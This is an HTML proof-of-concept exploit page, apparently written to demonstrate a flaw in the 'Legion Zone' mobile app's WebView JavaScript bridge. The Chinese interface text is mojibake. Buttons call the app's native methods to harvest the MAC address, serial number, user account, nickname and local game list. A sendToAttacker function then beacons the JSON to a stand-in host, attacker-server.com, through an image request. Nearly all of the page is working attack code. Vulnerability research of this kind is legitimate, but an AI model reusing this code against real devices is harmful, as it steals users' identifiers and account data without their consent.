<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Exploit POC</title>
<style>
body{margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace}
h1{color:#f00;text-align:center;margin-bottom:20px}
.log{background:#111;border:2px solid #0f0;padding:15px;margin:20px 0;border-radius:8px;max-height:500px;overflow-y:auto}
.log div{padding:8px;margin:5px 0;border-radius:4px;background:#222}
.success{color:#0f0;font-weight:bold}
.error{color:#f00;font-weight:bold}
.data{color:#0ff}
button{width:100%;padding:18px;margin:10px 0;background:#0f0;color:#000;border:none;font-size:16px;font-weight:bold;border-radius:8px;cursor:pointer}
button:active{background:#0a0}
</style>
</head>
<body>

<h1>ğŸ”“ Legion Zone Exploit</h1>

<div id="status" class="log">
<div class="data">æ­£åœ¨åˆå§‹åŒ–...</div>
</div>

<button onclick="stealSystemInfo()">ğŸ”´ çªƒå– MAC å’Œ SN</button>
<button onclick="stealUserInfo()">ğŸ”´ çªƒå–ç”¨æˆ·ä¿¡æ¯</button>
<button onclick="stealGames()">ğŸ”´ çªƒå–æ¸¸æˆåˆ—è¡¨</button>

<script>
var logEl = document.getElementById('status');
var callId = 1;

function log(msg, type) {
    var time = new Date().toLocaleTimeString();
    var className = type || 'data';
    var html = '<div class="' + className + '">[' + time + '] ' + msg + '</div>';
    logEl.innerHTML = html + logEl.innerHTML;
}

// æ£€æŸ¥æ¥å£
if (typeof window._LegionZoneMobile === 'undefined') {
    log('âŒ JSæ¥å£ä¸å­˜åœ¨ - å¯èƒ½ä¸åœ¨ç›®æ ‡WebViewä¸­', 'error');
} else {
    log('âœ… JSæ¥å£å·²æ‰¾åˆ°', 'success');
    
    // å®šä¹‰å›è°ƒå‡½æ•°
    window._LegionZoneMobile.nativeResponse = function(id, success, base64Data) {
        log('ğŸ“¥ æ”¶åˆ°Nativeå›è°ƒ: ' + id, 'data');
        
        if (!base64Data) {
            log('âš ï¸ æ— æ•°æ®è¿”å›', 'error');
            return;
        }
        
        try {
            var jsonString = atob(base64Data);
            log('âœ“ Base64è§£ç æˆåŠŸ', 'success');
            
            var data = JSON.parse(jsonString);
            log('âœ“ JSONè§£ææˆåŠŸ', 'success');
            
            // æ˜¾ç¤ºå…³é”®æ•°æ®
            log('â”â”â” çªƒå–çš„æ•æ„Ÿæ•°æ® â”â”â”', 'data');
            
            if (data.macAddress) {
                log('ğŸ”‘ MACåœ°å€: ' + data.macAddress, 'error');
            }
            if (data.serialNumber) {
                log('ğŸ”‘ åºåˆ—å·: ' + data.serialNumber, 'error');
            }
            if (data.sn) {
                log('ğŸ”‘ SN: ' + data.sn, 'error');
            }
            if (data.account) {
                log('ğŸ”‘ ç”¨æˆ·è´¦å·: ' + data.account, 'error');
            }
            if (data.nickName) {
                log('ğŸ”‘ ç”¨æˆ·æ˜µç§°: ' + data.nickName, 'error');
            }
            if (data.userName) {
                log('ğŸ”‘ ç”¨æˆ·å: ' + data.userName, 'error');
            }
            
            // æ˜¾ç¤ºå®Œæ•´æ•°æ®
            log('ğŸ“Š å®Œæ•´æ•°æ®: ' + jsonString, 'data');
            
            // æ¨¡æ‹Ÿå‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨
            sendToAttacker(data);
            
        } catch(e) {
            log('âŒ è§£æé”™è¯¯: ' + e.message, 'error');
        }
    };
    
    log('âœ… å›è°ƒå‡½æ•°å·²æ³¨å†Œ', 'success');
}

function sendToAttacker(data) {
    // ä½¿ç”¨ Image å¯¹è±¡å‘é€æ•°æ®ï¼ˆä¸å—è·¨åŸŸé™åˆ¶ï¼‰
    var img = new Image();
    img.src = 'https://attacker-server.com/collect?data=' + encodeURIComponent(JSON.stringify(data));
    log('ğŸ“¤ æ•°æ®å·²å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨', 'error');
}

function stealSystemInfo() {
    if (typeof window._LegionZoneMobile === 'undefined') {
        log('âŒ æ¥å£ä¸å­˜åœ¨', 'error');
        return;
    }
    
    var id = 'steal_system_' + callId++;
    log('âš¡ å‘èµ·æ”»å‡»: getSystemInfo (ID: ' + id + ')', 'data');
    
    try {
        window._LegionZoneMobile.nativeCall('LegionZone', 'getSystemInfo', id, '');
        log('âœ“ è°ƒç”¨æˆåŠŸï¼Œç­‰å¾…è¿”å›...', 'success');
    } catch(e) {
        log('âŒ è°ƒç”¨å¤±è´¥: ' + e.message, 'error');
    }
}

function stealUserInfo() {
    if (typeof window._LegionZoneMobile === 'undefined') {
        log('âŒ æ¥å£ä¸å­˜åœ¨', 'error');
        return;
    }
    
    var id = 'steal_user_' + callId++;
    log('âš¡ å‘èµ·æ”»å‡»: getUserInfo (ID: ' + id + ')', 'data');
    
    try {
        window._LegionZoneMobile.nativeCall('LegionZone', 'getUserInfo', id, '');
        log('âœ“ è°ƒç”¨æˆåŠŸï¼Œç­‰å¾…è¿”å›...', 'success');
    } catch(e) {
        log('âŒ è°ƒç”¨å¤±è´¥: ' + e.message, 'error');
    }
}

function stealGames() {
    if (typeof window._LegionZoneMobile === 'undefined') {
        log('âŒ æ¥å£ä¸å­˜åœ¨', 'error');
        return;
    }
    
    var id = 'steal_games_' + callId++;
    log('âš¡ å‘èµ·æ”»å‡»: getLocalGameList (ID: ' + id + ')', 'data');
    
    try {
        window._LegionZoneMobile.nativeCall('LegionZone', 'getLocalGameList', id, '');
        log('âœ“ è°ƒç”¨æˆåŠŸï¼Œç­‰å¾…è¿”å›...', 'success');
    } catch(e) {
        log('âŒ è°ƒç”¨å¤±è´¥: ' + e.message, 'error');
    }
}

log('âœ… POCé¡µé¢åŠ è½½å®Œæˆ', 'success');
log('ğŸ“± å½“å‰URL: ' + window.location.href, 'data');
</script>

</body>
</html>
